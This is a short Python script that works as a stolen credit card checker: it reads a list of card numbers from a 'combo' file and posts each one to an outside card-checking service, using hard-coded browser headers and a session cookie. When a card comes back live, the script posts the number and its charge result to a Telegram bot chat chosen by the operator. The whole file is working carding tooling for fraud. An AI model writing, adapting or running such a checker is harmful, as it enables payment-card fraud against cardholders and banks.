import requests
import random

G = '\033[1;32m'
E = '\033[1;31m'
S = '\033[1;33m'


file = input(f"{G}Enter Your Combo: ")
token = input(f"{S}Send Your Bot Tokeb : ")
id = input(f"{E}Send Your Account ID : ")
for hamody in open(file,"r").read().splitlines():
    card = hamody.split("\n")[0]
    #-------------Url-------------#
    url = "https://checker.visatk.com/ccn1/alien07.php"
    #-------------headers-------------#
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Connection':'keep-alive',
    'Content-Length': '57',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie':'__gads=ID=42ac6c196f03a9b4-2279e5ef3fcd001d:T=1645035753:RT=1645035753:S=ALNI_MZL7kDSE4lwgNP0MHtSLy_PyyPW3w; PHPSESSID=tdsh3u2p5niangsvip3gvvbc12',
    'Host':'checker.visatk.com',
    'Origin': 'https://checker.visatk.com',
    'Referer': 'https://checker.visatk.com/ccn1/',
    'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'X-Requests-With':'XMLHttpRequest'}

    #-------------data-------------#
    data = {
    'ajax':'1',
    'do':'check',
    'cclist':card
    }
    #-------------requests-------------#
    req = requests.post(url, headers=headers, data=data)
    #print(req)
    if '"error":0' in req.text:
        ss = req.text.split("[Charge :<font color=green>")[1].split("</font>] [BIN:")[0]
        vis = f"""
ᯓ New Hit 🥰
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ CC :  {card}
ᯓ Charge : {ss}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯"""
        print(G+vis)
        re = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={vis}")
    if '"error":-1' in req.text:
        print(S+"Unknown : "+card)
    else:
        print(E+"Die : "+card)